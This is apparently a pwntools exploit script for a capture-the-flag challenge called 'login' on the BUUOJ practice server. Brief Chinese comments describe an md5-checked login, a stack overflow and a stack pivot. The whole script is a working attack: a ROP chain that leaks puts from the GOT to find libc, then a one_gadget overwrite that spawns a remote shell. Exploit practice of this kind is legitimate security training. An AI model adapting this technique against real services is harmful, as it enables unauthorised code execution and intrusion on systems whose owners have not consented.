#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29101
elfpath = './login_patched'
ld = ELF("./ld-2.23.so")
libcpath = './libc.so.6'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))

# start pwning
'''
这题作者加了个md5，然后文件是stripped的，然后我他妈看了半天没看出来
而且就算看出来了，我也猜不到用来对比的校验值是'admin'的计算结果

题目就是栈溢出加栈迁移
'''
ru(b'Please Sign-in\n>')

bss = 0x602400
retaddr = 0x400876
pop_rdi_ret = 0x401ab3
call_puts = 0x4018b5

pld1 = b'admin'.ljust(8, b'\x00')
# pld1 += p64(retaddr)
pld1 += p64(pop_rdi_ret) + p64(e.got['puts']) + p64(call_puts)
s(pld1)

ru(b'Please input u Pass\n>')
if args.LOCAL:
    gdb.attach(p)
pld2 = b'admin'.ljust(0x20, b'\x00')
pld2 += p64(bss)
s(pld2)
puts = u64(ru7f()[-6:]+b'\x00'*2)
libc_base = puts - libc.sym['puts']
leak("libc_base", libc_base)
# == repeat it
ru(b'Please Sign-in\n>')
onegadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

pld1 = b'admin'.ljust(0x18, b'\x00')
# pld1 += p64(pop_rdi_ret) + p64(libc_base + next(libc.search(b'/bin/sh\x00')))
# pld1 += p64(libc_base + libc.sym['system'])
pld1 += p64(onegadgets[1] + libc_base)
s(pld1)

ru(b'Please input u Pass\n>')

# 需要考虑到第二次栈溢出时，栈与bss段发生了重叠，所以这里的输入会影响前面的bss段上的内容
pld2 = (b'admin'.ljust(0x8, b'\x00'))*4
pld2 += p64(bss+0x10)
s(pld2)

shell()

